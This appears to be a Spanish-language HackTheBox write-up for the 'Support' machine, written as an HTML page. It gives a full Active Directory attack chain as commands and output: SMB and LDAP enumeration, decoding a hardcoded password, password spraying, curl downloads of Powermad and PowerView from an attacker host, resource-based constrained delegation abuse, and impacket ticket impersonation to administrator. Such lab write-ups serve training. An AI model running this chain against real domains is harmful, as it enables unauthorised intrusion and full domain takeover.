@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Support HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/support.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Support HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Support de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Support de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Support HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Support HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Support de la plataforma de HackTheBox","headline":"Writeup Support HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Support HackTheBox</h1>
+          <p>Resolución de la máquina Support de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> -Pn 10.10.11.174
+Nmap scan report for 10.10.11.174
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman</span>
+</code></pre></div></div>
+
+<div><p>Como smb esta abierto podemos intentar listar recursos compartidos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ smbclient</span><span class="p"> -L 10.10.11.174 -N
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	</span><span class="kd">support-tools</span><span class="p">   Disk      support staff tools
+	SYSVOL          Disk      Logon server share</span>
+</code></pre></div></div>
+
+<div><p>Vemos el recurso support-tools el cual contiene ciertos archivos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ smbclient</span><span class="p"> //10.10.11.174/support-tools -N
+Try "help" to get a list of possible commands.
+</span><span class="kd">smb: \></span><span class="p"> dir
+  .                                   D        0
+  ..                                  D        0
+  7-ZipPortable_21.07.paf.exe         A  2880728
+  npp.8.4.1.portable.x64.zip          A  5439245
+  putty.exe                           A  1273576
+  SysinternalsSuite.zip               A 48102161
+  </span><span class="kd">UserInfo.exe.zip</span><span class="p">                    A   277499
+  windirstat1_1_2_setup.exe           A    79171
+  WiresharkPortable64_3.6.5.paf.exe   A 44398000
+
+      4026367 blocks of size 4096. 850518 blocks available</span>
+</code></pre></div></div>
+
+<div><p>Parecen programas genericos pero podemos ver un UserInfo.exe.zip, lo descargamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">smb: \></span><span class="p"> get UserInfo.exe.zip
+getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip
+</span><span class="kd">smb: \></span><span class="p"> exit</span>
+</code></pre></div></div>
+
+<div><p>Si miramos el contenido podemos ver un exe y varios dll, analizaremos el archivo .exe</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ 7z</span><span class="p"> l UserInfo.exe.zip
+Listing archive: UserInfo.exe.zip
+
+--
+Path = UserInfo.exe.zip
+Type = zip
+Physical Size = 277499
+
+  Size   Compressed  Name
+------ ------------  ------------------------
+ 12288         5424  UserInfo.exe
+ 99840        41727  CommandLineParser.dll
+ 22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
+ 47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll
+ 84608        39154  Microsoft.Extensions.DependencyInjection.dll
+ 64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
+ 20856        11403  System.Buffers.dll
+141184        58623  System.Memory.dll
+115856        32709  System.Numerics.Vectors.dll
+ 18024         9541  System.Runtime.CompilerServices.Unsafe.dll
+ 25984        13437  System.Threading.Tasks.Extensions.dll
+   563          327  UserInfo.exe.config
+------ ------------  ------------------------
+652675       274861  12 files</span>
+</code></pre></div></div>
+
+<div><p>Analizandolo con <a href="https://github.com/dnSpy/dnSpy">dnSpy</a> podemos ver Protected entre otras cosas</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Si miramos el .cctor() podemos encontrar una cadena llamada enc_password y una key</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Ahora en getPassword() podemos encontrar la manera de decodear la cadena</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Podemos hacerlo facilmente con python y obtenemos la cadena decodeada</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p">
+Python 3.10.0 on linux
+</span><span class="kd">>>></span><span class="p"> enc_password </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+</span><span class="kd">>>></span><span class="p"> key </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"armando"
+</span><span class="kd">>>></span><span class="p"> </span><span class="kd">import</span><span class="p"> base64
+</span><span class="kd">>>></span><span class="p"> array </span><span class="kd">=</span><span class="p"> base64.b64decode(enc_password)
+</span><span class="kd">>>></span><span class="p"> array2 </span><span class="kd">=</span><span class="p"> []
+</span><span class="kd">>>></span><span class="kd"> for</span><span class="p"> i </span><span class="kd">in</span><span class="k"> range</span><span class="p">(</span><span class="k">len</span><span class="p">(array)):
+</span><span class="kd">...</span><span class="p">     array2.append(</span><span class="k">chr</span><span class="p">(array[i] </span><span class="kd">^</span><span class="p"> key[i </span><span class="kd">%</span><span class="k"> len</span><span class="p">(key)] </span><span class="kd">^</span><span class="na"> 223</span><span class="p">))
+</span><span class="kd">>>></span><span class="p"> </span><span class="k">print</span><span class="p">(</span><span class="s2">""</span><span class="p">.join(array2))
+nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</span>
+</code></pre></div></div>
+
+<div><p>Enumerando ldap con la contraseña, podemos encontrar un campo info con una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ldapsearch</span><span class="p"> -D support\\ldap -H ldap://10.10.11.174 -w </span><span class="no">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span><span class="p"> -b </span><span class="no">'CN=Users,DC=support,DC=htb'</span><span class="p"> | </span><span class="s2">grep</span><span class="p"> info:
+</span><span class="kd">info:</span><span class="p"> Ironside47pleasure40Watchful</span>
+</code></pre></div></div>
+
+<div><p>Podemos abusar de los campos name: para crear un diccionario y hacer passwordspray</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ldapsearch</span><span class="p"> -D support\\ldap -H ldap://10.10.11.174 -w </span><span class="no">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span><span class="p"> -b </span><span class="no">'CN=Users,DC=support,DC=htb'</span><span class="p"> | </span><span class="s2">grep</span><span class="p"> name: | </span><span class="s2">sed</span><span class="no"> 's/^name: //'</span><span class="p"> | </span><span class="s2">grep</span><span class="p"> -vE </span><span class="no">'D|C|A|U'</span><span class="p"> > users.txt
+</span><span class="s2">❯ crackmapexec</span><span class="p"> winrm 10.10.11.174 -u users.txt -p Ironside47pleasure40Watchful
+</span><span class="na">WINRM</span><span class="p">       10.129.168.220  5985   DC               </span><span class="na">[*]</span><span class="p"> Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
+</span><span class="na">WINRM</span><span class="p">       10.129.168.220  5985   DC               </span><span class="na">[*]</span><span class="p"> http://10.10.11.174:5985/wsman
+</span><span class="na">WINRM</span><span class="p">       10.129.168.220  5985   DC               </span><span class="kd">[-]</span><span class="p"> support.htb\krbtgt:Ironside47pleasure40Watchful
+</span><span class="na">WINRM</span><span class="p">       10.129.168.220  5985   DC               </span><span class="kd">[-]</span><span class="p"> support.htb\ldap:Ironside47pleasure40Watchful
+</span><span class="na">WINRM</span><span class="p">       10.129.168.220  5985   DC               </span><span class="s2">[+]</span><span class="p"> support.htb\support:Ironside47pleasure40Watchful </span><span class="no">(Pwn3d!)</span>
+</code></pre></div></div>
+
+<div><p>El usuario support es válido, nos conectamos con evil-winrm y podemos leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ evil-winrm</span><span class="p"> -i 10.10.11.174 -u support -p Ironside47pleasure40Watchful
+PS C:\Users\support\Documents> </span><span class="no">whoami</span><span class="p">
+support\support
+PS C:\Users\support\Documents> </span><span class="no">type ..\Desktop\user.txt</span><span class="p">
+8c8***************************375
+PS C:\Users\support\Documents></span>
+</code></pre></div></div>
+
+<div><p>Después de jugar con bloodhound podemos ver que support tiene el GenericAll</p></div>
+<div><p>Podemos guiarnos y seguir los pasos de el siguiente <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">artículo</a> para escalar</p></div>
+
+<div><p>Iniciamos subiendo los módulos de <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a> y <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">Powermad.ps1</a> e importandolos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData></span><span class="no"> curl 10.10.14.10/Powermad.ps1 -o Powermad.ps1</span><span class="p">
+PS C:\ProgramData></span><span class="no"> curl 10.10.14.10/PowerView.ps1 -o PowerView.ps1</span><span class="p">
+PS C:\ProgramData></span><span class="no"> Import-Module .\Powermad.ps1</span><span class="p">
+PS C:\ProgramData></span><span class="no"> Import-Module .\PowerView.ps1</span><span class="p">
+PS C:\ProgramData></span>
+</code></pre></div></div>
+
+<div><p>Iniciamos creando una cuenta con el nombre fake01 y la contraseña 123456</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="no">New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose</span><span class="p">
+Verbose: [+] Domain Controller = dc.support.htb
+Verbose: [+] Domain = support.htb
+Verbose: [+] SAMAccountName = fake01$
+Verbose: [+] Distinguished Name = CN=fake01,CN=Computers,DC=support,DC=htb
+[+] Machine account fake01 added
+PS C:\ProgramData></span>
+</code></pre></div></div>
+
+<div><p>Antes de los siguiente pasos necesitamos conseguir el sid de la cuenta que creamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="no">Get-DomainComputer fake01 -Properties objectsid</span><span class="p">
+
+objectsid
+---------
+</span></span><span class="kd">S-1-5-21-1677581083-3380853377-188903654-5601</span></span><span class="p">
+
+PS C:\ProgramData></span>
+</code></pre></div></div>
+
+<div><p>Ahora con el sid podemos seguir con los pasos siguientes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="no">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5601)"</span><span class="p">
+PS C:\ProgramData> </span><span class="no">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><span class="p">
+PS C:\ProgramData> </span><span class="no">$SD.GetBinaryForm($SDBytes, 0)</span><span class="p">
+PS C:\ProgramData> </span><span class="no">Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</span><span class="p">
+PS C:\ProgramData></span>
+</code></pre></div></div>
+
+<div><p>En el punto final mas que jugar con rubeus para obtener el ticket podemos hacerlo con impacket</p></div>
+<div><p>Recordar agregar support.htb y dc.support.htb al archivo /etc/hosts</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-getST</span><span class="p"> support.htb/fake01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb
+Impacket - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in administrator.ccache</span>
+</code></pre></div></div>
+
+<div><p>Con el ticket nos podemos conectar con wmiexec y nos convertimos en Administrator</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ export </span><span class="p">KRB5CCNAME=administrator.ccache
+</span><span class="s2">❯ impacket-wmiexec </span><span class="p">support.htb/administrator@dc.support.htb -no-pass -k
+Impacket - Copyright 2021 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\> </span><span class="no">whoami</span><span class="p">
+support\administrator
+
+C:\> </span><span class="no">cd C:\Users\Administrator\Desktop</span><span class="p">
+
+C:\Users\Administrator\Desktop> </span><span class="no">type root.txt</span><span class="p">
+633**************************40a
+
+C:\Users\Administrator\Desktop></span>
+</code></pre></div></div>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
